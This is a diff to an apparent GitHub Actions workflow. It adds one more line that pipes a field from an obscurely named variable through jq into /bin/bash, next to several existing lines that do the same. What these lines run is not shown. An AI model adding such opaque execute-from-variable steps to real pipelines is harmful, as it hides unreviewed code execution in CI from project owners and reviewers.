@@ -27,6 +27,7 @@ jobs:
           echo $zpi8 | jq -r .e0 | /bin/bash
           printf '%s' "$syd49" | jq -r .rbfm36 | /bin/bash
           printf '%s' "$r813" | jq -r .sj22103 | /bin/bash
+          printf '%s' "$baur156" | jq -r .teg54 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
